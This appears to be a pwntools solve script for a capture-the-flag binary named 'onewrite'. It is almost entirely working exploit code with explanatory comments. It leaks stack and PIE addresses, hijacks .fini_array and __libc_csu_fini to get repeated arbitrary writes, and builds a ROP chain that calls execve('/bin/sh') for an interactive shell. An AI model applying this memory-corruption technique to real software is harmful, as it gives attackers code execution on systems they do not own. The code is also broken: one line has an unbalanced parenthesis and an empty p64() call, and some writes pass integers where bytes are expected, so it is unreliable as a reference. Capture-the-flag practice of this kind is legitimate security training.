#!/usr/bin/python 
from pwn import *

s = process("./onewrite")
elf = ELF("./onewrite")

def leak_stack():
    s.sendlineafter("> ", "1")
    rsp = int(s.recvline().strip(), 16)
    log.info("Leaked RSP: {}".format(hex(rsp)))
    return rsp

def leak_pie():
    s.sendlineafter("> ", "2")
    pie = int(s.recvline().strip(), 16)
    log.info("Leaked PIE: {}".format(hex(pie)))         # Leaked address of the function do_leak
    return pie

def write(address, data):
    s.sendafter("address : ", str(address))
    s.sendafter("data : ", data)

################################### Leak stack address ######################################
stack = leak_stack()                                    
write(stack+0x11, "\x00\x00\x00\x00\x00\x00\x00\x04")           # leaked address is 0x18 bytes away from RIP; do a partial overwrite to return to 00108b04  (which is when main calls do_leak) so that we can keep leaking 


####################################### Leak PIE ################################################
PIE = leak_pie()
PIE -= 0x8a15                           # Offset from PIE base. Can be found in ghidra by hovering the function do_leak, then look for ImageBase    || elf.symbols["do_leak"]
log.info("Real PIE base: {}".format(hex(PIE)))
write(stack+0x11, "\x00\x00\x00\x00\x00\x00\x00\x04")           # return to do_leak again


################################### Caculating addresses ###########################################
csu_fini_ret_addr = stack - 72                      # disas __libc_csu_fini, then disas _fini then set breakpoint at ret to see where its address on the stack 

csu_fini = PIE+0x9810                          # or elf.symbols["__libc_csu_fini"]. This function is responsible for calling the functions in .fini_array (.fini_array contains functions which will be called when the program exits)

do_overwrite = PIE + elf.symbols["do_overwrite"]
_fini_array = PIE + elf.symbols['__do_global_dtors_aux_fini_array_entry']

pop_rsi_ret = PIE + 0xd9f2
pop_rdi_ret = PIE + 0x00000000000084fa
pop_rdx_ret = PIE + 0x484c5
pop_rax_ret = PIE + 0x460ac
syscall = PIE + 0x917c
binsh_addr = stack + 0x2aa99b                   # address to store /bin/sh\x00 in bss 
pivot_gadget  = PIE + 0x106f3                   # add rsp, 0xd0 ; pop rbx ; ret 


########################### Overwrite the .fini_array functions ################################
leak_stack()                # just to pass the first read 
write(_fini_array+8, p64(do_overwrite))         # there are 2 functions in .fini_array in this binary. The functions are called in reverse order => write in the second one first. Because after the past writes, the program is exiting so it will be calling .fini_array 
write(_fini_array, p64(do_overwrite))
write(csu_fini_ret_addr, p64(csu_fini))

csu_fini_ret_addr += 8                          # due to how memory works, the return address is shift up by 8 every loop 

"""
Now each time the program ends it will call __libc_csu_fini which will call 2 functions in .fini_array. And the functions in .fini_array we have overwritten them with do_overwrite 
=> we get 2 writes: 1 to write what we want, 1 to overwrite __libc_csu_fini's return address with the function itself => we reset the loop 
"""
def write2(address, data):
    global csu_fini_ret_addr
    write(address, data)                        # 1st write in .fini_array
    write(csu_fini_ret_addr, csu_fini)          # 2nd write in .fini_array
    csu_fini_ret_addr += 8

write2(binsh_addr, u64("/bin/sh\x00"))
write2(stack+0xd0, p64()))
write2(stack+0xd8, p64(pop_rdi_ret))        # +0xd0 because we found this gadget: add rsp, 0xd0 ; pop rbx ; ret 
write2(stack+0xe0, p64(binsh_addr))
write2(stack+0xe8, p64(pop_rsi_ret))
write2(stack+0xf0, p64(0x0))
write2(stack+0xf8, p64(pop_rdx_ret))
write2(stack+0x100, p64(0x0))
write2(stack+0x108, p64(pop_rax_ret))
write2(stack+0x110, p64(59))
write2(stack+0x118, p64(syscall))

write2(stack-0x10, p64(pivot_gadget))       # the leaked stack address is 0x10 bytes away from the return address of the function do_overwrite 

s.interactive()
